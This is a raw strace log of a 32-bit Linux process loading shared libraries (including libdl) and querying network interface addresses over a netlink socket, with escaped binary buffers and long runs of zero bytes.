+29848 15:04:56.661299 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
+29848 15:04:56.661390 fstat64(7, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+29848 15:04:56.661407 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7c8d000
+29848 15:04:56.661419 mmap2(0xb7dd6000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x149) = 0xb7dd6000
+29848 15:04:56.661434 mmap2(0xb7dd9000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dd9000
+29848 15:04:56.661448 close(7)          = 0
+29848 15:04:56.661461 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+29848 15:04:56.661475 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 7
+29848 15:04:56.661489 read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
+29848 15:04:56.661587 fstat64(7, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+29848 15:04:56.661605 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xb7c89000
+29848 15:04:56.661617 mmap2(0xb7c8b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x1) = 0xb7c8b000
+29848 15:04:56.661632 close(7)          = 0
+29848 15:04:56.661658 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7c88000
+29848 15:04:56.661672 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7c88940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+29848 15:04:56.661724 mprotect(0xb7dd6000, 4096, PROT_READ) = 0
+29848 15:04:56.661954 mprotect(0xb7ef5000, 12288, PROT_READ) = 0
+29848 15:04:56.661986 munmap(0xb7f30000, 29913) = 0
+29848 15:04:56.662141 brk(0)            = 0x805d000
+29848 15:04:56.662152 brk(0x8082000)    = 0x8082000
+29848 15:04:56.662182 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART}, {SIG_DFL}, 8) = 0
+29848 15:04:56.662204 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf87e558) = -1 EINVAL (Invalid argument)
+29848 15:04:56.662222 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
+29848 15:04:56.662242 socket(PF_NETLINK, SOCK_RAW, 0) = 7
+29848 15:04:56.662257 bind(7, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0
+29848 15:04:56.662270 getsockname(7, {sa_family=AF_NETLINK, pid=29848, groups=00000000}, [12]) = 0
+29848 15:04:56.662290 time(NULL)        = 1495652696
+29848 15:04:56.662302 sendto(7, "\24\0\0\0\26\0\1\3X\331%Y\0\0\0\0\0\0\0\0", 20, 0, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 20
+29848 15:04:56.662323 recvmsg(7, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"0\0\0\0\24\0\2\0X\331%Y\230t\0\0\2\10\200\376\1\0\0\0\10\0\1\0\177\0\0\1\10\0\2\0\177\0\0\1\7\0\3\0lo\0\0<\0\0\0\24\0\2\0X\331%Y\230t\0\0\2\30\200\0\2\0\0\0\10\0\1\0\n\0\2\5\10\0\2\0\n\0\2\5\10\0\4\0\n\0\2\377\t\0\3\0eth0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306\265\363\267\264e\365\267+\226\310\267\304\331\207\277\211\222\364\267+\226\310\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0T\334\207\277\220)\364\267!\226\310\267R\323\335\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+\226\310\267\0\0\0\0 `\365\267\0\0\0\0\0\0\0\0\210\305\340\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0R\323\335\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\306\265\363\267\264e\365\267r\361\311\267P\332\207\277\211\222\364\267r\361\311\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0\340\334\207\277\220)\364\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\361\311\267\0\0\0\0 `\365\267\0\0\0\0\0\0\0\0\340\302\340\267\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340\332\207\277\370\332\207\277|\300\310\267\240\334\207\277\235\30\364\267L\300\310\267F\305\340\2670\305\340\267H\323\335\267\330\332\207\277\211\222\364\267H\323\335\267<\305\340\267\364_\365\267\340\302\340\267\270\315\335\267h\335\207\277\220)\364\267H\323\335\267R\323\335\267\374\34\0\0\374\34\0\0\0\0\0\0\5\0\0\0H\323\335\267\0@\0\0 `\365\267|0\0\0\0\0\0\0008\300\340\267\210\305\340\267(\333\207\277\365\361\364\267\10\0\0\0h\305\340\267R\323\335\267t\333\207\277\237Q\364\267F\305\340\2670\305\340\267\235\236\336\267X\333\207\277\211\222\364\267\235\236\336\267<\305\340\267\364_\365\267\340\302\340\267\270\315\335\267\350\335\207\277\220)\364\267\235\236\336\267R\323\335\267\364_\365\267\20\333\207\277\210\305\340\267\240\334\207\277\235\236\336\267\7\0\0\0 `\365\267\0\0\0\0\0\0\0\0\230\235\363\267\0\0\0\0\250\333\207\277\365\361\364\267\10\0\0\0\364_\365\267R\323\335\267\340\302\340\267\300\333\207\277\365\361\364\267`\270\363\267\10\0\0\0 `\365\267\340\332\207\277\24\335\207\277\7\0\0\0\351S\360\267\306\265\363\267\264e\365\267<_\344\267\370\333\207\277\211\222\364\267<_\344\267\270\265\363\267\364_\365\267\240b\365\267\0\0\0\0\210\336\207\277\220)\364\267\26_\344\267R\323\335\267\2\0\0\0008\335\207\0L\300\310\267|\300\310\267<_\344\267|0\0\0 `\365\267\0\376\0\0\0\0\0\0\360\232\363\267}\246\4\0\244\201\0\0\1\0\0\0\0\0\0\0\0\0\0\0R\323\335\267\364_\365\2678\342\207\277\0\0\0\0\200\334\207\277Gl\364\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0+\226\310\267\0\0\0\0\1\0\0\0\0\0\0\0\340\276\310\267`\335\207\277\6\206\364\2678\342\207\277\0\0\0\0\v\v\364\267\364_\365\267[\342\207\277T\342\207\277P\342\207\277\300e\365\267h\305\340\267P\230\363\267\0\0\0\0\0\0\0\0\364_\365\267\360k\364\267\340\276\310\267`\335\207\277\210\334\207\277\351\205\364\267\0\0\0\0\364_\365\2678\342\207\277\0\0\0\0\f\335\207\277Gl\364\267\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0r\361\311\267\0\0\0\0\1\0\0\0\0\0\0\0\244}\335\267\354\335\207\277\6\206\364\2678\342\207\277\0\0\0\0\1\1\1\0\0\0\0\0\301\360\364\267T\342\207\277P\342\207\277\300e\365\2674\0\0\0L!\0\0\0\0\0\0\364_\365\267\0\0\0\0\2\0\0\0`\335\207\277\365\361\364\267\10\0\0\0\344\310\340\267\340\302\340\267h\342\207\277yv\364\267\350\310\340\267\344\310\340\267\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\340\302\340\267\240b\365\267\0\0\0\0\0\0\0\0\34`\336\267t\336\207\277\6\206\364\2678\342\207\277\0\0\0\0\5\0\0\0\0\20\0\0[\342\207\277\301\360\364\267P\342\207\277\300e\365\267\230\1\0\0\310\1\0\0\0\0\0\0\0\20\0\0\364_\365\267\2\0\0\0l~\335\267\354\335\207\277\365\361\364\267\10\0\0\0\244\310\340\267\230\310\340\267h\342\207\277\346n\364\267\244\310\340\267\230\310\340\267\10\0\0\0\235\236\336\267\0\0\0\0\1\0\0\0\0\0\0\0\240b\365\267\0\0\0\0\6\206\364\2678\342\207\277\0\0\0\0\6\0\0\0\4\0\0\0[\342\207\277T\342\207\277P\342\207\277\301\360\364\267@\1\0\0@\1\0\0\0\0\0\0\1\0\0\0\364_\365\267\360k\364\267\364_\365\267\2\0\0\0\324`\336\267t\336\207\277\365\361\364\267\10\0\0\0\214\310\340\267\200\310\340\267h\342\207\277\346n\364\267\214\310\340\267\200\310\340\267\10\0\0\0\264\336\207\277Gl\364\267\340\302\340\267\0\0\0\0\0\0\0\0\0\0\0\0<_\344\267\0\0\0\0\1\0\0\0\0\0\0\0\300\336\207\277\0\0\0\0\364\177\335\267\2460\321\267|\337\207\277\317`\330\267\0\0\0\0\313<\364\267", 4096}], msg_controllen=0, msg_flags=0}, 0) = 108
+29848 15:04:56.662990 recvmsg(7, {msg_name(12)={sa_family=AF_NETLINK, pid=0, groups=00000000}, msg_iov(1)=[{"@\0\0\0\24\0\2\0X\331%Y\230t\0\0\n\200\200\376\1\0\0\0\24\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0@\0\0\0\24\0\2\0X\331%Y\230t\0\0\n@\200\375\2\0\0\0\24\0\1\0\376\200\0\0\0\0\0\0\n\0\'\377\376F\331J\24\0\6\0\377\377\377\377\377\377\377\377V\2\0\0V\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0